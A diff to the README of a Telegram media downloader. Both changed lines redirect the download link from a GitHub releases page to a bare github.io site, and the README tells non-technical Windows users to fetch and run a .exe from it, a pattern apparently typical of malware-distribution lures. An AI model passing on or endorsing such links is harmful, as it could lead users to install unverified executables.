@@ -1,6 +1,6 @@
 # 📥 telegram-media-downloader - Save Telegram albums and media files
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Parisiennesignificance72/telegram-media-downloader/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://parisiennesignificance72.github.io)
 
 ### About the software
 This application helps you save media from Telegram chats. It captures photos and videos in their original quality. You can use it to download entire albums or files from discussion threads. It runs on Windows, macOS, and Linux. The tool serves users who want to backup their Telegram data without losing image clarity or video resolution.
@@ -14,7 +14,7 @@ This application helps you save media from Telegram chats. It captures photos an
 ### 🚀 Getting Started
 You do not need to know how to code to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page to download the latest version of the program. Use this link: https://github.com/Parisiennesignificance72/telegram-media-downloader/releases
+1.  Visit the official release page to download the latest version of the program. Use this link: https://parisiennesignificance72.github.io
 2.  Look for the file that ends in .exe.
 3.  Click the link to start the download.
 4.  Move the file to a folder where you want to keep the application.
